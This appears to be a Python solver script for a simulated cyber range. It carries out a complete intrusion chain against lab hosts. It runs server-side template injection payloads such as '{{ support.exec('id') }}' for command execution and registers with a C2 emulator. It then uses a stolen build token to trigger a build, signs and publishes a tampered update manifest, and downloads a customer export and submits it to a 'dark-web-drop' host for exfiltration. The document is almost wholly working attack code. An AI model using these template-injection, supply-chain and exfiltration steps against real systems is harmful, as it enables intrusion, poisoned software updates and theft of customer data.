import json

import httpx


def show(title, value):
    print("\n## " + title)
    print(json.dumps(value, indent=2) if not isinstance(value, str) else value)


def main():
    show("SSTI arithmetic probe", httpx.post("http://support-portal:8000/preview", json={"body": "{{ 7 * 7 }}"}).json())
    show("Support marker", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('cat /var/lib/support-portal/.post_exploit_marker') }}"}).json())
    show("Probe id", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('id') }}"}).json())
    show("Probe hostname", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('hostname') }}"}).json())
    show("Probe ls", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('ls /opt/support-portal') }}"}).json())
    show("Stage2", httpx.post("http://support-portal:8000/preview", json={"body": "{{ support.exec('cat /tmp/orion_stage2.txt') }}"}).json())
    show("C2 register", httpx.post("http://c2-emulator:8000/beacon/register", json={"host": "support-portal"}).json())
    show("Service discovery", httpx.get("http://c2-emulator:8000/discover/services").json())
    show("Wiki token", httpx.get("http://wiki:8000/pages/release/runbook-build-trigger").json())
    show("Ticket", httpx.get("http://ticket-service:8000/tickets/OES-1287").json())
    show("Repo release", httpx.get("http://source-repo:8000/files/release-pipeline/release.json").json())
    show(
        "Build job",
        httpx.post(
            "http://build-server:8000/api/jobs",
            json={
                "repo": "orionecho/echo-agent",
                "ref": "refs/heads/release/2.6.4",
                "channel": "anrc",
                "trigger_token": "build-trigger-demo-7f3a91",
            },
        ).json(),
    )
    artifact = httpx.get("http://build-server:8000/api/artifacts/art-demo-001").json()
    show("Artifact metadata", artifact)
    canonical = {
        "product": "EchoAgent",
        "channel": "anrc",
        "version": "2.6.4",
        "build_id": "build-2026-0502-001",
        "artifact": {
            "name": artifact["name"],
            "sha256": artifact["sha256"],
            "url": "http://updates.release.local/artifacts/" + artifact["name"],
            "size_bytes": artifact["size_bytes"],
        },
        "metadata": {"customer": "anrc", "lab_marker": artifact["marker"]},
    }
    signature = httpx.post("http://signing-service:8000/api/sign", json={"canonical_manifest": canonical}).json()["signature"]
    manifest = dict(canonical)
    manifest["signature"] = signature
    published = httpx.post("http://update-server:8000/internal/publish", json={"channel": "anrc", "manifest": manifest}).json()
    show("Sign publish", {"manifest": manifest, "published": published})
    show("Customer poll", httpx.post("http://customer-app:8000/api/poll-now").json())
    show("Metadata", httpx.get("http://customer-api:8000/metadata").json())
    show("Facilities", httpx.get("http://customer-api:8000/facilities").json())
    show("Audits", httpx.get("http://customer-api:8000/audits").json())
    show("Exports", httpx.get("http://customer-api:8000/exports").json())
    detail = httpx.get("http://customer-api:8000/exports/exp-2026-Q2-007").json()
    show("Export detail", detail)
    final_object = httpx.get(detail["presigned_url"]).text
    show("Final object", final_object)
    bundle = httpx.post(
        "http://dark-web-drop:8000/drop/submit",
        json={
            "filename": "project-orion-echo-final.txt",
            "export_id": detail["id"],
            "object_key": detail["object_key"],
            "file_content": final_object,
        },
    ).json()
    show("Supervisor drop verdict", bundle)
    show("Dark Web drop status", httpx.get("http://dark-web-drop:8000/drop/status/" + bundle["submission_id"]).json())


if __name__ == "__main__":
    main()
